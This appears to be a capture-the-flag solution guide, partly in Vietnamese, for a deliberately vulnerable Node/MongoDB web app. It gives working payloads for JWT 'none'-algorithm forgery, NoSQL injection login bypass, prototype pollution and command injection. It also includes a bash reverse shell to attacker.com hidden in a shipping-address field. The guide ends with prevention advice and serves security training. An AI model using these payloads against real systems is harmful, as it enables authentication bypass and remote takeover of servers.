# Challenge 3 Solution Guide

## Vulnerability Chain

Để đạt được RCE và đọc flag, cần chain các lỗ hổng sau:

1. **JWT Algorithm Confusion** → Bypass authentication, gain admin access
2. **Prototype Pollution** → Modify object prototypes, potential RCE
3. **NoSQL Injection** → Bypass authentication hoặc extract data
4. **Command Injection** → RCE via shipping address
5. **Authorization Bypass** → Access admin endpoints

## Step-by-Step Exploitation

### Method 1: JWT Algorithm Confusion + Admin Access

**Step 1: Create JWT with None Algorithm**

JWT verification không specify algorithm, có thể exploit algorithm confusion:

```python
import jwt

# Create token with 'none' algorithm
payload = {
    'id': 'admin_id',
    'username': 'admin',
    'role': 'admin'
}

# Sign with 'none' algorithm (no signature)
token = jwt.encode(payload, '', algorithm='none')
```

**Step 2: Use Token to Access Admin Endpoints**

```bash
curl -H "Authorization: Bearer $token" http://localhost:3000/api/admin/flag
```

### Method 2: NoSQL Injection in Login

**Step 1: Exploit NoSQL Injection**

Login endpoint có NoSQL injection:

```json
POST /api/auth/login
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

Hoặc để login as admin:

```json
{
  "username": "admin",
  "password": {"$regex": ".*"}
}
```

**Step 2: Get JWT Token**

Sau khi login thành công, nhận JWT token.

**Step 3: Access Admin Endpoint**

Sử dụng token để access `/api/admin/flag`.

### Method 3: Prototype Pollution + RCE

**Step 1: Exploit Prototype Pollution**

Endpoint `/api/products` (POST) merge user input:

```json
POST /api/products
Authorization: Bearer <admin_token>
{
  "name": "Test",
  "description": "Test",
  "price": 10,
  "additionalData": {
    "__proto__": {
      "isAdmin": true
    }
  }
}
```

**Step 2: Chain với Command Injection**

Sau khi pollute prototype, có thể trigger command injection trong order endpoint.

### Method 4: Command Injection Direct

**Step 1: Create Order với Command Injection**

```json
POST /api/orders
Authorization: Bearer <token>
{
  "productId": "123",
  "quantity": 1,
  "shippingAddress": "; id; #"
}
```

Command sẽ được execute trên server.

**Step 2: Reverse Shell**

```json
{
  "shippingAddress": "; bash -c 'bash -i >& /dev/tcp/attacker.com/1234 0>&1'; #"
}
```

## Complete Exploit Chain

1. **NoSQL Injection** để login as admin
2. **Get JWT token**
3. **Use token** để access `/api/admin/flag`
4. **Alternative**: Chain với command injection để RCE

## Exploit Script

Xem `exploit.py` trong thư mục này.

## Key Learning Points

1. **JWT Security**: Always specify algorithm in verify()
2. **NoSQL Injection**: Sanitize user input in MongoDB queries
3. **Prototype Pollution**: Use Object.create(null) for safe objects
4. **Command Injection**: Never use user input in system commands
5. **Authorization**: Always verify permissions server-side

## Prevention

1. Specify algorithm in JWT verification
2. Use parameterized queries for MongoDB
3. Use Object.create(null) instead of {}
4. Use execFile with arguments array
5. Implement proper RBAC

